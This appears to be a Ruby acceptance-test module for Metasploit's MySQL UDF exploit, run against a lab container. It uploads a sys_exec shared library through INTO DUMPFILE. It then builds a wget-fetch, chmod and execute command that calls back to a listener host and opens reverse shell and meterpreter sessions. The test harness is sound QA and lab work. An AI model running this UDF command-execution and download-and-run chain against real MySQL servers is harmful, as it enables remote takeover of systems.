# frozen_string_literal: true

require_relative '../mysql_schema/acceptance'

# Native UDF/fetch controls, genuine sessions and explicit lab artifact recovery.
module MysqlUdfTarget
  include MysqlSchemaTarget

  OWNER = 'exploit/multi/mysql/mysql_udf_payload'
  FAMILIES = { 'shell' => 'linux/x86/shell_reverse_tcp', 'meterpreter' => 'linux/x86/meterpreter_reverse_tcp' }.freeze
  NATIVE_LIBRARY = '/usr/lib64/mysql/plugin/module-target-native-udf.so'

  def rc_owner
    OWNER
  end

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'mysql-udf.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def mu_sql(sql)
    output, = rc_command('native-sql', 'app', 'bash', '/opt/module-target/native.sh', 'sql', sql)
    output
  end

  def mu_port
    socket = TCPServer.new('0.0.0.0', 0)
    socket.local_address.ip_port
  ensure
    socket&.close
  end

  def mu_files
    ms_native('inventory').lines.to_h do |line|
      match = line.chomp.match(/\A([a-f0-9]{64})  (.+)\z/)
      raise IOError, 'Unrecognized native inventory row' unless match

      [match[2], match[1]]
    end
  end

  def mu_reset
    ms_native('reset')
    current = mu_files
    @rc.fetch(:artifacts) << { phase: 'before-explicit-lab-reset', files: current.reject { |path, _sha| @baseline.key?(path) } }
    current.each do |path, sha|
      next if @baseline.key?(path)

      expect(path).to match(%r{\A(?:/tmp/[^/]+|/tmp/module-target-udf/[^/]+|/usr/lib64/mysql/plugin/[^/]+)\z})
      expect(target_exec('app', 'sha256sum', path).split.first).to eq(sha)
      target_exec('app', 'rm', '--', path)
    end
    expect(mu_files).to eq(@baseline)
    expect(mu_sql("SELECT COUNT(*) FROM mysql.func WHERE name='sys_exec';").strip).to eq('0')
    rc_save
  end

  def mu_native_denials
    { 'udf_no_file' => ["SELECT 0x74657374 INTO DUMPFILE '/tmp/module-target-udf/native-denied';", '1227'], 'udf_no_catalog' => ["SELECT * FROM mysql.func WHERE name='sys_exec';", '1142'] }.each do |username, (sql, code)|
      output, status = rc_command('native-denial-' + username, 'app', 'mysql', '--protocol=TCP', '--host=127.0.0.1', '--user=' + username, '--password=' + MysqlSchemaTarget::PASSWORD, '--database=mysql', '--execute=' + sql, required: false)
      # mysql writes SQL diagnostics to stderr, recorded by rc_command.
      record = @rc.fetch(:commands).last
      expect(status).not_to eq(0)
      expect(record.fetch(:stderr)).to include('ERROR ' + code)
      @rc.fetch(:native) << { username: username, denial_code: code, exit: status, stdout_base64: Base64.strict_encode64(output.b) }
    end
    expect(mu_files).to eq(@baseline)
  end

  def mu_install_native
    bytes = File.binread('data/exploits/mysql/lib_mysqludf_sys_64.so')
    expect(Digest::SHA256.hexdigest(bytes)).to eq('c071278f921475bc6f252b10b771dda4948596ef6d81b689bd936a2a9058b5cc')
    mu_sql("SELECT 0x#{bytes.unpack1('H*')} INTO DUMPFILE '#{NATIVE_LIBRARY}'; CREATE FUNCTION sys_exec RETURNS INTEGER SONAME '#{File.basename(NATIVE_LIBRARY)}';")
    expect(mu_files.fetch(NATIVE_LIBRARY)).to eq(Digest::SHA256.hexdigest(bytes))
    marker = '/tmp/module-target-udf/native-marker'
    expect(mu_sql("SELECT sys_exec('printf native-udf > #{marker}');").strip).to eq('0')
    expect(target_exec('app', 'cat', marker)).to eq('native-udf')
    expect(target_exec('app', 'stat', '-c', '%u', marker).strip).to eq(@uid)
  end

  def mu_session_proof(identifier, family, owner)
    path = "/tmp/module-target-druid-session-#{Process.pid}_#{identifier}-#{identifier}"
    proof = rc_json("DruidSessionControl.proof(framework,#{identifier},#{path.inspect})")
    expect(target_exec('app', 'cat', path)).to eq(family == 'shell' ? 'druid-session' : '')
    expect(target_exec('app', 'stat', '-c', '%u', path).strip).to eq(@uid)
    expect(target_exec('app', 'cat', "/proc/#{proof.fetch('pid')}/status")[/^Uid:\s+(\d+)/, 1]).to eq(@uid)
    metadata = rc_json("begin;s=framework.sessions.fetch(#{identifier});{id:s.sid,type:s.type,owner:s.via_exploit,payload:s.via_payload,db_id:s.db_record&.id};end")
    expect(metadata).to include('owner' => owner, 'payload' => 'payload/' + FAMILIES.fetch(family), 'db_id' => be_a(Integer))
    @rc.fetch(:sessions) << { family: family, metadata: metadata, proof: proof }
    rc_save
    rc_json("DruidSessionControl.exit_remote(framework,#{identifier})")
    rc_poll { target_exec('app', 'bash', '-c', 'if test -e "$1"; then echo present; else echo absent; fi', 'bash', "/proc/#{proof.fetch('pid')}").strip == 'absent' }
    console_command("sessions -k #{identifier}") if rc_json('framework.sessions.keys').include?(identifier)
    rc_poll { rc_sql("SELECT closed_at IS NOT NULL FROM sessions WHERE id=#{metadata.fetch('db_id')}").strip == 't' }
    target_exec('app', 'rm', '--', path)
  end

  def mu_wait_session(family)
    rc_poll(25) do
      events = File.readlines(@observer.fetch('ready_event_path')).map { |line| JSON.parse(line) }
      rc_json('framework.sessions.map{|id,s|{id:id,type:s.type}}').find do |row|
        row.fetch('type') == family && events.any? { |event| event.fetch('id') == row.fetch('id') }
      end
    end.fetch('id')
  end

  def mu_native_payload(family)
    payload = FAMILIES.fetch(family)
    port = mu_port
    run_target_module('exploit/multi/handler', 'app', { 'PAYLOAD' => payload, 'LHOST' => @callback, 'LPORT' => port, 'ReverseListenerBindAddress' => '0.0.0.0', 'ExitOnSession' => false }, endpoint_options: {}, action: 'run -j')
    rc_poll { rc_json('framework.jobs.values.count{|job|job.ctx.first.fullname=="exploit/multi/handler"}') == 1 }
    file = File.join(target_runtime.fetch('artifacts'), 'native-' + family + '.elf')
    generated = rc_json("begin;value=SaltDeploymentSessionControl.executable(framework.jobs.values.find{|job|job.ctx.first.fullname=='exploit/multi/handler'},#{payload.inspect},framework);File.binwrite(#{file.inspect},Base64.strict_decode64(value.delete(:executable_base64)));value.delete(:command_base64);value;end")
    executable = File.binread(file)
    expect(Digest::SHA256.hexdigest(executable)).to eq(generated.fetch('executable_sha256'))
    server = TCPServer.new('127.0.0.1', 0)
    requests = []
    sender = Thread.new do
      raise Timeout::Error, 'No native wget request' unless IO.select([server], nil, nil, 12)

      socket = server.accept
      begin
        request = socket.gets("\r\n\r\n")
        requests << request
        socket.write("HTTP/1.1 200 OK\r\nContent-Length: #{executable.bytesize}\r\nConnection: close\r\n\r\n" + executable)
      ensure
        socket.close
      end
    end
    sender.report_on_exception = false
    destination = '/tmp/module-target-udf/native-' + family
    command = "wget -qO #{destination} http://#{@callback}:#{server.local_address.ip_port}/native-#{family};chmod +x #{destination};#{destination} &"
    expect(mu_sql("SELECT sys_exec('#{command}');").strip).to eq('0')
    Timeout.timeout(15) { sender.value }
    expect(target_exec('app', 'sha256sum', destination).split.first).to eq(generated.fetch('executable_sha256'))
    expect(requests.first).to start_with("GET /native-#{family} HTTP/1.1\r\n")
    mu_session_proof(mu_wait_session(family), family, 'exploit/multi/handler')
    @rc.fetch(:native) << { family: family, payload: payload, generated: generated.except('executable_base64', 'command_base64'), request_base64: Base64.strict_encode64(requests.first) }
    rc_save
  ensure
    server&.close
    sender&.kill if sender&.alive?
    sender&.join
    console_command('jobs -K')
  end

  def mu_call(label, family: 'shell', session_id: nil, reuse: false, options: {})
    port = mu_port
    selected = { 'TARGET' => 1, 'PAYLOAD' => FAMILIES.fetch(family), 'USERNAME' => 'udf_admin', 'PASSWORD' => MysqlSchemaTarget::PASSWORD, 'LHOST' => @callback, 'LPORT' => port, 'ReverseListenerBindAddress' => '0.0.0.0', 'SRVHOST' => '127.0.0.1', 'SRVPORT' => mu_port, 'URIHOST' => @callback, 'WfsDelay' => 3, 'ConnectTimeout' => 3, 'FORCE_UDF_UPLOAD' => false, 'SESSION' => session_id }.merge(options)
    selected['RPORT'] = @unused_port if session_id
    event_count = rc_json('framework.instance_variable_get(:@mysql_udf_events).length')
    record = { label: label, options: selected, files_before: mu_files }
    @rc.fetch(:calls) << record
    output = run_target_module(OWNER, 'app', selected, action: 'run -z', allow_errors: true, reuse_module: reuse, command_timeout: 90) do |text|
      record[:output_base64] = Base64.strict_encode64(text.b)
      record[:events] = rc_json('framework.instance_variable_get(:@mysql_udf_events)').drop(event_count)
      rc_save
    end
    expect(output).not_to match(/Call stack:|Error while running command|Unknown datastore option|not a compatible payload/)
    expect(record.fetch(:events)).to include(include('event' => 'call', 'method' => 'exploit'))
    record[:files_after] = mu_files
    record[:identity] = rc_json('active_module.object_id')
    rc_save
    [output, record]
  end

  def mu_owner_success(label, family: 'shell', session_id: nil, reuse: false, options: {})
    output, record = mu_call(label, family: family, session_id: session_id, reuse: reuse, options: options)
    mu_session_proof(mu_wait_session(family), family, OWNER)
    expect(output).not_to match(/Exploit failed|Exploit aborted|no session was created|Unknown datastore option/)
    library = mu_sql("SELECT dl FROM mysql.func WHERE name='sys_exec';").strip
    expect(File.basename(library)).to eq(library)
    files = mu_files
    expect(files.fetch('/usr/lib64/mysql/plugin/' + library)).to eq(Digest::SHA256.file('data/exploits/mysql/lib_mysqludf_sys_64.so').hexdigest)
    commands = record.fetch(:events).select { |event| event.values_at('event', 'method') == %w[call execute_command] }
    expect(commands).not_to be_empty
    expected = commands.map { |event| event.fetch('executable_sha256') }.uniq
    expect(expected.length).to eq(1)
    expect(files.reject { |path, _sha| @baseline.key?(path) }.values).to include(expected.first)
    expect(commands.map { |event| event.fetch('executable_header_hex')[0, 10] }.uniq).to eq(['7f454c4601'])
    console_command('jobs -K')
    record
  end
end
